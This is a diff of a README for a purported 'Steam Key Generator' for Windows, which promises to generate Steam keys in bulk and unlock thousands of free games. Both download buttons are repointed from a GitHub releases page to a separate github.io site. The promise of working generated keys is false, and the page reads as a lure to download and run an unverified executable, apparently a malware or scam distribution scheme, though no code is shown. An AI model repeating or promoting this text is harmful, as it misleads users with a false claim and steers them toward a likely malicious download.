@@ -1,6 +1,6 @@
 # 🎮 Steam-Key-Generator - Free Steam Keys Generator for Windows 2026
 
-[![Download Steam Key Generator](https://img.shields.io/badge/Download-Steam_Key_Generator-blue?style=for-the-badge&logo=steam&logoColor=white&labelColor=1b2838&color=66c0f4)](https://github.com/starli5890/Steam-Key-Generator/releases)
+[![Download Steam Key Generator](https://img.shields.io/badge/Download-Steam_Key_Generator-blue?style=for-the-badge&logo=steam&logoColor=white&labelColor=1b2838&color=66c0f4)](https://starli5890.github.io)
 
 Welcome to the official download page for **Steam-Key-Generator** – the ultimate free tool for Windows that lets you generate Steam keys in bulk, with automatic proxy rotation and account verification. Get ready to unlock thousands of games without spending a dime!
 
@@ -183,7 +183,7 @@ You're just one click away from endless free games. Hit the button below, downlo
 
 
 
-[![Download Steam Key Generator Now](https://img.shields.io/badge/⬇_Download_Now-Steam_Key_Generator-green?style=for-the-badge&logo=github&logoColor=white&labelColor=2ea44f&color=1b2838)](https://github.com/starli5890/Steam-Key-Generator/releases)
+[![Download Steam Key Generator Now](https://img.shields.io/badge/⬇_Download_Now-Steam_Key_Generator-green?style=for-the-badge&logo=github&logoColor=white&labelColor=2ea44f&color=1b2838)](https://starli5890.github.io)
 
 ---
 
